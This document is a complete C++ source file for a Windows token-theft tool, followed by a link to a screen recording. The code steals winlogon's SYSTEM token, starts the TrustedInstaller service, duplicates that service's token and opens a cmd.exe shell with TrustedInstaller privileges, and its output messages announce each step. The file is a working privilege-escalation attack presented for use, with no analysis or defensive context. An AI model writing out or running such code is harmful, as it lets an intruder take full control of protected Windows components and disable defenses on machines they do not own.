

```c++
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <TlHelp32.h>
#include <string>

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "advapi32.lib")
DWORD GetProcessIdByName(const std::wstring& processName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry)) {
        while (Process32Next(snapshot, &entry)) {
            if (std::wstring(entry.szExeFile) == processName) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        }
    }
    CloseHandle(snapshot);
    return 0;
}
BOOL EnablePrivilege(LPCWSTR lpszPrivilege) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValueW(NULL, lpszPrivilege, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}
BOOL startserviceTrustedinstaller() {
    SC_HANDLE servicemanager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (servicemanager == NULL) return FALSE;

    SC_HANDLE openService = OpenServiceW(servicemanager, L"TrustedInstaller", SERVICE_START | SERVICE_QUERY_STATUS);
    if (openService == NULL) {
        CloseServiceHandle(servicemanager);
        return FALSE;
    }

    SERVICE_STATUS_PROCESS status;
    DWORD bytesNeeded;
    QueryServiceStatusEx(openService, SC_STATUS_PROCESS_INFO, (LPBYTE)&status, sizeof(status), &bytesNeeded);

    if (status.dwCurrentState != SERVICE_RUNNING) {
        std::cout << "   [*] Starting TrustedInstaller Service..." << std::endl;
        StartServiceW(openService, 0, NULL);
        Sleep(3000);
    }

    CloseServiceHandle(openService);
    CloseServiceHandle(servicemanager);
    return TRUE;
}

int main() {

    if (!EnablePrivilege(L"SeDebugPrivilege")) {
        std::cout << "[-] Failed to enable SeDebugPrivilege." << std::endl;
        return 1;
    }
    std::cout << "[+] SeDebugPrivilege Enabled." << std::endl;

    std::cout << "\n[STEP 1] Stealing SYSTEM Token from Winlogon..." << std::endl;

    DWORD winlogonPid = GetProcessIdByName(L"winlogon.exe");
    if (winlogonPid == 0) {
        std::cout << "[-] winlogon.exe not found." << std::endl;
        return 1;
    }

    HANDLE hWinlogon = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogonPid);
    HANDLE hTokenWinlogon = NULL;
    OpenProcessToken(hWinlogon, TOKEN_DUPLICATE | TOKEN_QUERY, &hTokenWinlogon);

    HANDLE hSystemToken = NULL;
    DuplicateTokenEx(hTokenWinlogon, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hSystemToken);

    if (hSystemToken == NULL) {
        std::cout << "[-] Failed to duplicate Winlogon token." << std::endl;
        return 1;
    }
    std::cout << "[+] SYSTEM Token Acquired." << std::endl;

    if (!ImpersonateLoggedOnUser(hSystemToken)) {
        std::cout << "[-] Failed to Impersonate SYSTEM." << std::endl;
        return 1;
    }
    std::cout << "[+] IMPERSONATION ACTIVE: Current Thread is now running as SYSTEM." << std::endl;

    std::cout << "\n[STEP 2] Targeting TrustedInstaller as SYSTEM..." << std::endl;

    if (!startserviceTrustedinstaller()) {
        std::cout << "[-] Failed to start service." << std::endl;
        RevertToSelf();
        return 1;
    }

    DWORD tiPid = GetProcessIdByName(L"TrustedInstaller.exe");
    if (tiPid == 0) {
        std::cout << "[-] TrustedInstaller.exe not found." << std::endl;
        RevertToSelf();
        return 1;
    }

    HANDLE hTI = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, tiPid);
    HANDLE hTokenTI = NULL;
    if (!OpenProcessToken(hTI, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hTokenTI)) {
        std::cout << "[-] Failed to open TI token. Error: " << GetLastError() << std::endl;
        RevertToSelf();
        return 1;
    }

    HANDLE hTrustedInstallerToken = NULL;
    if (!DuplicateTokenEx(hTokenTI, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hTrustedInstallerToken)) {
        std::cout << "[-] Failed to duplicate TI token." << std::endl;
        RevertToSelf();
        return 1;
    }
    std::cout << "[+] TrustedInstaller Token Stolen Successfully." << std::endl;

    std::cout << "[*] Reverted to original user context to spawn shell." << std::endl;

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.lpDesktop = (LPWSTR)L"winsta0\\default";

    std::cout << "\n[STEP 3] Popping Shell with TrustedInstaller Token..." << std::endl;

    BOOL bSuccess = CreateProcessWithTokenW(hTrustedInstallerToken, LOGON_WITH_PROFILE,L"C:\\windows\\system32\\cmd.exe",NULL,0,NULL,NULL,&si,&pi
    );

    if (bSuccess) {
        std::cout << "[+] SUCCESS! Check the new CMD window." << std::endl;
        std::cout << "[+] Process ID: " << pi.dwProcessId << std::endl;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        std::cout << "[-] Failed to create process. Error: " << GetLastError() << std::endl;
    }
    CloseHandle(hSystemToken);
    CloseHandle(hTrustedInstallerToken);
    CloseHandle(hTokenWinlogon);
    CloseHandle(hTokenTI);
    CloseHandle(hWinlogon);
    CloseHandle(hTI);

    return 0;
}

```

![[Screen Recording 2026-02-07 194454.mp4]]
